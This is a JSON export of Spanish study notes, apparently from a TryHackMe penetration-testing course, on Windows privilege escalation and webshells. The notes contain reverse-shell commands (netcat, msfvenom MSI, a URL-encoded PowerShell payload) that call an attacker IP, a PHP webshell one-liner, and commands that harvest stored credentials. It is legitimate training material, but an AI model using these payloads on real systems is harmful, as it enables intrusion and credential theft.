[
  {
    "title": "3. Other Quick Wins",
    "path": "/apuntes/ciberseguridad/thm/1-career/2-penetration-tester/1-jr-penetration-tester/8-privilege-escalation/3-windows-privilege-escalation/3-other-quick-wins/",
    "src": "content/Ciberseguridad/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/8. Privilege Escalation/3. Windows Privilege Escalation/3. Other Quick Wins.md",
    "breadcrumb": "Ciberseguridad > THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 8. Privilege Escalation > 3. Windows Privilege Escalation",
    "content": "La escalada de privilegios no siempre es un reto. A veces las malas configuraciones pueden permitirte obtener privilegios elevados. Los siguientes escenarios pertenecen más a los CTF que a los escenarios de la vida real. Sin embargo, si los métodos anteriores fallan, no pierdes nada probando estos.\n\n--------------------------------------\n<h2>Scheduled Tasks</h2>\nMirando en las tareas programadas del sistema objetivo, puedes ver alguna tarea programada que haya perdido su binario o esté usando un binario que puedas modificar.\n\nLas tareas programadas pueden ser listadas desde la linea de comandos usando el comando `schtasks` sin opciones. Para recuperar información detallada sobre cualquier servicio, puedes usar un comando como el siguiente:\n\n```cmd\nC:\\> schtasks /query /tn vulntask /fo list /v\nFolder: \\\nHostName:                             THM-PC1\nTaskName:                             \\vulntask\nTask To Run:                          C:\\tasks\\schtask.bat\nRun As User:                          taskusr1\n```\n\nRecibirás mucha información, pero lo que nos interesa a nosotros es el parámetro \"Task to run\", que indica lo que se ejecuta por la tarea programada y el parámetro \"Run As User\" que muestra qué usuario ejecutará la tarea.\n\nSi nuestro usuario actual puede modificar o sobrescribir el ejecutable listado en \"Task to Run\", podemos controlar lo que se ejecuta, resultando en una escalada de privilegios. Para comprobar los permisos del archivo ejecutable podemos usar `icacls`:\n\n```cmd\nC:\\> icacls c:\\tasks\\schtask.bat\nc:\\tasks\\schtask.bat NT AUTHORITY\\SYSTEM:(I)(F)\n                    BUILTIN\\Administrators:(I)(F)\n                    BUILTIN\\Users:(I)(F)\n```\n\nComo podemos ver en el resultado, el grupo **BUILTIN\\Users** tiene acceso completo (**F**) sobre el binario. Esto significa que podemos modificar el archivo `.bar` e insertar cualquier payload que queramos. Cambiemos el binario a:\n\n```powershell\ncmd /c \"echo C:\\tools\\nc64.exe -e powershell.exe 192.168.128.94 4444 > C:\\tasks\\schtask.bat\"\n```\n\nLuego comenzamos un listener en nuestra máquina:\n\n`nc -lvp 4444`\n\nLa próxima vez que se ejecute la tarea programada, recibiremos una reverse shell con los privilegios del usuario `taskusr1`.\n\nSi puedes ejecutar la tarea para no tener que esperar, hazlo con: `schtasks /run /tn vulntask`.\n\n-----------------------------------\n<h2>AlwaysInstallElevated</h2>\nLos archivos Windows Installer, también conocidos como archivos `.msi`, se usan para instalar aplicaciones en el sistema. Suelen correr con los privilegios del usuario que los ejecuta. Sin embargo pueden ser configurados para correr con privilegios superiores (incluso desde una cuenta sin privilegios). Esto nos permitiría generar archivos MSI maliciosos que corrieran con permisos de administrador.\n\nEste método requiere que haya dos valores registry configurados. Puedes encontrar estos desde la linea de comandos usando los comandos de abajo:\n\n```cmd\nC:\\> reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\nC:\\> reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\n```\n\nSi **AMBOS** están configurados, puedes generar un archivo MSI malicioso con msfvenom así:\n\n`msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_MACHINE_IP LPORT=LOCAL_PORT -f msi -o malicious.msi`\n\nComo es una reverse shell debes ejecutar el handler de Metasploit correctamente configurado. Una vez configurado puedes ejecutar el archivo MSI de la siguiente forma y recibirás la shell.\n\n```cmd\nC:\\> msiexec /quiet /qn /i C:\\Windows\\Temp\\malicious.msi\n```",
    "modified": "2025-11-29T00:48:12"
  },
  {
    "title": "4. Abusing Service Misconfigurations",
    "path": "/apuntes/ciberseguridad/thm/1-career/2-penetration-tester/1-jr-penetration-tester/8-privilege-escalation/3-windows-privilege-escalation/4-abusing-service-misconfigurations/",
    "src": "content/Ciberseguridad/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/8. Privilege Escalation/3. Windows Privilege Escalation/4. Abusing Service Misconfigurations.md",
    "breadcrumb": "Ciberseguridad > THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 8. Privilege Escalation > 3. Windows Privilege Escalation",
    "content": "<h2>Windows Services</h2>\nLos servicios de Windows son manejados por el **Service Control Manager** (SCM). El SCM es un proceso a cargo de gestionar el estado de los servicios como se necesite, comprobar el estado de cualquier servicio indicado y ofrecer una forma de configurar servicios.\n\nCada proceso en Windows tiene asociado un ejecutable que será ejecutado por el SCM cuando se inicie el servicio. Los servicios y ejecutables implementan funciones especiales para ser capaces de comunicarse con el SCM por lo que no cualquier ejecutable puede ser arrancado como servicio exitosamente. Cada servicio especifica también la cuenta de usuario bajo la que correrá.\n\nPara entender mejor la estructura de un servicio, nos fijaremos en la configuración del servicio `apphostsvc` con el comando `sc qc`:\n\n```cmd\nC:\\> sc qc apphostsvc\n[SC] QueryServiceConfig SUCCESS\n\nSERVICE_NAME: apphostsvc\n        TYPE               : 20  WIN32_SHARE_PROCESS\n        START_TYPE         : 2   AUTO_START\n        ERROR_CONTROL      : 1   NORMAL\n        BINARY_PATH_NAME   : C:\\Windows\\system32\\svchost.exe -k apphost\n        LOAD_ORDER_GROUP   :\n        TAG                : 0\n        DISPLAY_NAME       : Application Host Helper Service\n        DEPENDENCIES       :\n        SERVICE_START_NAME : localSystem\n```\n\nAquí podemos ver que el ejecutable asociado se especifica a través del parámetro **BINARY_PATH_NAME** y la cuenta usada para correr el servicio se muestra en el parámetro **SERVICE_START_NAME**.\n\nLos servicios tienen una Lista de Control de Acceso Discrecional (DACL), la cual indica quién tiene permiso para empezar, parar, pausar, ver el estado, la configuración o reconfigurar el servicio entre otros privilegios. Puedes ver el DACL a través el \"Process Hacker\" en el escritorio de la máquina ofrecida.\n\n![[Pasted image 20251128225827.png]]\n\nTodas las configuraciones de servicios se pueden guardar en el registro bajo `HKLM\\SYSTEM\\CurrentControlSet\\Services\\`:\n\n![[Pasted image 20251128225919.png]]\n\nExiste una subclave para cada servicio en el sistema. Podemos ver el ejecutable asociado en el valor **ImagePath** y la cuenta usada para comenzar el servicio en el valor **ObjectName**. Si DACL ha sido configurado para nuestro servicio, será almacenado en una subclave llamada **Security**. Sólo los administradores pueden modificar dicho registro.\n\n------------------------------\n<h2>Insecure Permissions on Service Executable</h2>\n\n\n------------------------------------\n<h2>Unquoted Service Paths</h2>\n\n\n--------------------------------------\n<h2>Insecure Service Permissions</h2>",
    "modified": "2025-11-29T00:48:12"
  },
  {
    "title": "2. Harvesting Passwords from Usual Spots",
    "path": "/apuntes/ciberseguridad/thm/1-career/2-penetration-tester/1-jr-penetration-tester/8-privilege-escalation/3-windows-privilege-escalation/2-harvesting-passwords-from-usual-spots/",
    "src": "content/Ciberseguridad/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/8. Privilege Escalation/3. Windows Privilege Escalation/2. Harvesting Passwords from Usual Spots.md",
    "breadcrumb": "Ciberseguridad > THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 8. Privilege Escalation > 3. Windows Privilege Escalation",
    "content": "La manera más fácil de conseguir acceso a otro usuario es conseguir credenciales en una máquina comprometida. Aquí presentaremos algunos sitios donde buscar contraseñas en un sistema Windows.\n\n------------------------------------\n<h2>Unattended Windows Installations</h2>\nAl instalar Windows en un gran número de hosts, los administradores pueden usar los Servicios de Despliegue de Windows, que permiten desplegar una sola imagen de SO a varios hosts a través de la red. Este tipo de instalaciones se llaman \"unattended installations\" ya que no requieren interacción del usuario. Requieren el uso de una cuenta administradora para realizar la configuración inicial, que puede acabar siendo guardada en alguna de las siguientes localizaciones:\n\n- `C:\\Unattend.xml`\n- `C:\\Windows\\Panther\\Unattend.xml`\n- `C:\\Windows\\Panther\\Unattend\\Unattend.xml`\n- `C:\\Windows\\system32\\sysprep.inf`\n- `C:\\Windows\\system32\\sysprep\\sysprep.xml`\n\nComo parte de estos archivos puedes encontrar credenciales.\n\n```xml\n<Credentials>\n    <Username>Administrator</Username>\n    <Domain>thm.local</Domain>\n    <Password>MyPassword123</Password>\n</Credentials>\n```\n\n---------------------------------------\n<h2>Powershell History</h2>\nCuando un usuario ejecuta un comando usando Powershell, se almacena en un archivo que tiene una memoria de comandos pasados. Es útil para repetir comandos que hayas usado antes rápidamente. Si un usuario ejecuta un comando que contiene una contraseña como parte directamente, puede ser recuperado después usando el siguiente comando desde `cmd.exe`.\n\n`type %userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt`\n\n>[!CAUTION] Este comando sólo funciona desde `cmd.exe`.\n\n----------------------------------------\n<h2>Saved Windows Credentials</h2>\nWindows nos permite usar las credenciales de otro usuario. Esta función también nos da la opción de guardar estas credenciales en el sistema. El siguiente comando lista las credenciales guardadas.\n\n`cmdkey /list`\n\nAunque no puedes ver las contraseñas en sí, si ves que hay credenciales que merece la pena probar puedes hacerlo con el comando `runas` de la siguiente manera:\n\n`runas /savecred /user:admin cmd.exe`\n\n-------------------------------------\n<h2>IIS Configuration</h2>\nInternet Information Services (Servicios de Información de Internet) es el servidor web por defecto de las instalaciones Windows. La configuración de los sitios web en IIS se almacena en un archivo llamado `web.config` y puede guardar contraseñas para bases de datos o mecanismos de autentificación configurados. Dependiendo de la versión instalada de IIS, podemos encontrar `web.config` en alguno de los siguientes ficheros:\n\n- `C:\\inetpub\\wwwroot\\web.config`\n- `C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\Config\\web.config`\n\nAquí tienes un modo rápido de encontrar strings de conexiones a bases de datos en el archivo:\n\n`type C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\Config\\web.config | findstr connectionString`\n\n---------------------------------------\n<h2>Retrieve Credentials from Software: PuTTY</h2>\nPuTTY es un cliente SSH comúnmente encontrado en sistemas Windows. En vez de tener que especificar parámetros de conexión cada vez, los usuarios pueden guardar sesiones donde la IP, usuario y otras configuraciones pueden guardarse para más adelante. Aunque PuTTY no permite a los usuarios guardar la contraseña SSH, guarda configuraciones proxy que pueden incluir credenciales de autentificación en texto plano.\n\nPara recuperar las credenciales proxy guardadas, puedes buscar bajo la siguiente clave de registro por la ProxyPassword con el siguiente comando:\n\n`reg query HKEY_CURRENT_USER\\Software\\SimonTatham\\PuTTY\\Sessions\\ /f \"Proxy\" /s`\n\n>[!NOTE] Simon Tatham es el creador de PuTTY y su nombre forma parte del path, no es un nombre de usuario.\n\nAl igual que PuTTY, cualquier software que almacene contraseñas, incluyendo navegadores, clientes de email o de FTP o SSH, tendrá métodos para recuperar las contraseñas guardadas.\n\n>[!TIP] Para entrar en una máquina Windows con `xfreerdp3` utiliza el siguiente comando: `xfreerdp3 /dynamic-resolution +clipboard /cert:ignore /v:10.82.139.185 /u:<usuario> /p:'<contraseña>'`",
    "modified": "2025-11-29T00:48:12"
  },
  {
    "title": "1. Windows Privilege Escalation",
    "path": "/apuntes/ciberseguridad/thm/1-career/2-penetration-tester/1-jr-penetration-tester/8-privilege-escalation/3-windows-privilege-escalation/1-windows-privilege-escalation/",
    "src": "content/Ciberseguridad/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/8. Privilege Escalation/3. Windows Privilege Escalation/1. Windows Privilege Escalation.md",
    "breadcrumb": "Ciberseguridad > THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 8. Privilege Escalation > 3. Windows Privilege Escalation",
    "content": "Dicho de manera simple, la escalada de privilegios consiste en usar el acceso dado a un host con el usuario A para ganar acceso al usuario B para, eventualmente, obtener permisos de administrador. Aunque queremos llegar a root, puede que tengamos que escalar a otras cuentas intermedias (sin privilegios) antes de encontrar un vector de escalada a root.\n\nGanar acceso a las diferentes cuentas puede ser tan simple como encontrar credenciales en archivos de texto u hojas de cálculo, pero ese no siempre será el caso.\n\nDependiendo de la situación podemos necesitar abusar alguna de las siguientes debilidades:\n\n- Malas configuraciones en servicios de Windows o tareas programadas.\n- Privilegios excesivos otorgados a nuestra cuenta.\n- Software vulnerable.\n- Perderse parches de seguridad de Windows.\n\nAntes de ver las técnicas, echemos un vistazo a diferentes tipos de cuenta en un sistema Windows.\n\n---------------------------------------------\n<h2>Usuarios de Windows</h2>\nLos sistemas Windows tienen principalmente 2 tipos de usuarios. Dependiendo del nivel de acceso, podemos categorizarlos en:\n\n| Usuario            | Explicación                                                                                                                                                                                              |\n| ------------------ | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |\n| **Administrators** | Estos usuarios tienen los mayores privilegios. Pueden cambiar cualquier parámetro de configuración y acceder a cualquier archivo del sistema.                                                            |\n| **Standard Users** | Estos usuarios pueden acceder al ordenador pero sólo realizar tareas limitadas. Típicamente estos usuarios no pueden hacer cambios permanentes o esenciales al sistema y están limitados a sus archivos. |\n\nCualquier usuario con privilegios administrativos, será parte del grupo **Administrators**. Por el otro lado, aquellos usuarios estándar serán parte del grupo **Users**.\n\nEn adición a eso, normalmente escucharás sobre algunas cuentas especialmente construidas usadas por el sistema operativo en el contexto de la escalada de privilegios.\n\n| Usuario                  | Explicación                                                                                                                                                                           |\n| ------------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |\n| **SYSTEM / LocalSystem** | Una cuenta usada por el sistema operativo para realizar tareas internas. Tiene accesos totales a los archivos y recursos disponibles en el host incluso con privilegios más elevados. |\n| **Local Service**        | Cuenta usada por defecto para correr servicios de Windows con los mínimos privilegios posibles. Usará conexiones anónimas en la red.                                                  |\n| **Network Service**      | Cuenta por defecto usada para correr servicios de Windows con los mínimos privilegios posibles. Usará credenciales para autentificarse a través de la red.                            |\n\nEstas cuentas se crean y se gestionan por Windows y no serás capaz de usarlas como cuentas normales. Aunque en algunas situaciones puedes ganar sus privilegios debido a la explotación de ciertos servicios.",
    "modified": "2025-11-29T00:48:12"
  },
  {
    "title": "11. Webshells",
    "path": "/apuntes/ciberseguridad/thm/1-career/2-penetration-tester/1-jr-penetration-tester/8-privilege-escalation/1-what-the-shell/11-webshells/",
    "src": "content/Ciberseguridad/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/8. Privilege Escalation/1. What the Shell/11. Webshells.md",
    "breadcrumb": "Ciberseguridad > THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 8. Privilege Escalation > 1. What the Shell",
    "content": "Hay momentos en los que nos encontramos con sitios web que nos dan la oportunidad de subir, de una forma u otra, un archivo ejecutable. Idealmente, usaríamos esta oportunidad para subir código que activase una reverse o bind shell, pero a veces no es posible. En estos casos, podríamos subir en su lugar una webshell. \n\n\"Webshell\" es un término coloquial para un script que corre dentro de un servidor (normalmente en PHP o ASP) que ejecuta código en el servidor. Los comandos se introducen en la web, ya sea a través de HTML (como un formulario) o directamente en parámetros de la URL.\n\nPHP sigue siendo el lenguaje de scripting más común del lado del servidor. Veamos un poco de código simple.\n\n`<?php echo \"< pre>\" . shell_exec($_GET[\"cmd\"]) . \"< /pre>\"; ?>`\n\nEsto, tomará el parámetro GET en la URL y lo ejecutará en el sistema con `shell_exec()`. Lo que significa que cualquier cosa que metamos en la URL después de `cmd=`, se ejecutará en el servidor. Los elementos `< pre >` son sólo para asegurarnos de que se formatea correctamente en en la página.\n\n>[!CAUTION] Los elementos pre van sin espacios, están escritos así para no ser interpretados.\n>\n\n\n![[Pasted image 20251125130855.png]]\n\nHay una gran variedad de webshells disponibles en Kali en `/usr/share/webshells`.\n\n>[!IMPORTANT] La mayoría de webshells escritas en PHP se escriben para sistemas Unix, por lo que no funcionarán en Windows.\n\nPara obtener RCE en un objetivo Windows, con el ejemplo anterior, podemos usar:\n\n`powershell%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%27<IP>%27%2C<PORT>%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22`\n\nEs la misma que la de la tarea 8, solo que URL-encodeada.\n\n>[!CAUTION] Recuerda cambiar la IP y el puerto.",
    "modified": "2025-11-29T00:48:12"
  }
]